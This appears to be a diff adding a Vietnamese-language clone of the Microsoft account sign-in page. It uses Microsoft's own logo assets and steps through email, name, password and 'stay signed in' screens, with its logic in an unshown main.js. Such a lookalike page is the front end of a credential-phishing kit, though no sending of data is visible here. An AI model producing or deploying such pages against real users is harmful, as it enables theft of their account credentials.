@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập vào tài khoản Microsoft</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <form action="" method="GET">
+        <div class="background"></div>
+        <div class="outer">
+            <div class="main-section">
+                <div class="middle">
+                    <div class="full-height">
+                        <div class="flex-column">
+                            <div class="win-scroll" id="phan-1">
+                                <div class="lightbox">
+                                    <div class="lightbox-cover">
+                                        <div class="logo">
+                                            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="logo">
+                                        </div>
+                                        <div class="main">
+                                            <div class="title">Đăng nhập</div>
+                                            <div class="input">
+                                                <span class="span"></span>
+                                                <input type="email" placeholder="Email" id="Email">
+                                            </div>
+                                            <div class="tai-khoan">
+                                                <div class="row">
+                                                    <div class="row-1">
+                                                        <p>Không có tài khoản?</p>
+                                                        <a href="#">Tạo tài khoản!</a>
+                                                    </div>
+                                                    <div class="row-2">
+                                                        <a href="#">Đăng nhập bằng khóa bảo mật</a>
+                                                    </div>
+                                                </div>
+                                                <div class="button">
+                                                    <button id="next">Tiếp theo</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="cred-box">
+                                    <div class="cred-content">
+                                        <div class="row-title">
+                                            <div class="table">
+                                                <div class="key">
+                                                    <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" alt="khoa">
+                                                </div>
+                                                <div class="table-cell">
+                                                    <div class="data-bind">
+                                                        Tùy chọn đăng nhập
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Phần tên -->
+                            <div class="lightbox" id="ten">
+                                <div class="lightbox-cover">
+                                    <div class="logo">
+                                        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="logo">
+                                    </div>
+                                    <div class="main">
+                                        <div class="back">
+                                            <div class="button-back">
+                                                <img src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="back">
+                                            </div>
+                                            <!-- tên email -->
+                                            <div class="span_back"></div>
+                                        </div>
+                                        <div class="title">Tên bạn là gì?</div>
+                                        <div class="input">
+                                            <div class="form-group">
+                                                <span class="span"></span>
+                                                <input type="text" id="lastname" placeholder="Họ">
+                                            </div>
+                                            <div class="form-group">
+                                                <span class="span"></span>
+                                                <input type="text" id="firstname" placeholder="Tên">
+                                            </div>
+                                        </div>
+                                        <div class="button-ten">
+                                            <div class="button">
+                                                <button id="next2"> Tiếp theo</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!--  -->
+                            <!-- phan 2 -->
+                            <div class="lightbox" id="phan-2">
+                                <div class="lightbox-cover">
+                                    <div class="logo">
+                                        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="logo">
+                                    </div>
+                                    <div class="main">
+                                        <div class="back">
+                                            <div class="button-back">
+                                                <img src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="back">
+                                            </div>
+                                            <!-- tên email -->
+                                            <div class="span_back"></div>
+                                            
+                                        </div>
+                                        <div class="title">Nhập mật khẩu</div>
+                                        <div class="pass">
+                                            <span class="span"></span>
+                                            <input type="password" placeholder="Mật khẩu" id="pass">
+                                        </div>
+                                        <div class="row">
+                                            <div class="row-1">
+                                                <a href="#">Quên mật khẩu?</a>
+                                            </div>
+                                            <div class="row-2">
+                                                <a href="#">Gửi mã qua email tới </a>
+                                            </div>
+                                        </div>
+                                        <div class="button">
+                                            <button id="login">Đăng nhập</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- phan 3 -->
+                            <div class="lightbox" id="phan-3">
+                                <div class="lightbox-cover">
+                                    <div class="logo">
+                                        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="logo">
+                                    </div>
+                                    <div class="main">
+                                        <div id="chu_email"></div>
+                                        <div class="title">Duy trì đăng nhập?</div>
+                                        <div class="text">
+                                            <p>Duy trì đăng nhập để bạn không phải đăng nhập lại 
+                                                lần tiếp theo.
+                                            </p>
+                                        </div>
+                                        <div class="button">
+                                            <div class="check-box">
+                                                <label for="check">
+                                                    <input type="checkbox" id="check" value="True">
+                                                    <span>Không hiển thị lại thông báo này</span>
+                                                </label>
+                                            </div>
+                                            <div class="row">
+                                                <div class="col">
+                                                    <div class="choice">
+                                                        <button id="no" type="button">Không</button>
+                                                    </div>
+                                                    <div class="choice">
+                                                        <button type="button" id="yes">Có</button>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+           
+                        </div>
+                        <div class="footer">
+                            <div class="footer-link">
+                                <a href="#">Điều khoản sử dụng</a>
+                                <a href="#">Quyền riêng tư & cookie</a>
+                                <a href="#">...</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form>
+</body>
+<script>
+</script>
+<script src="main.js"></script>
+</html>
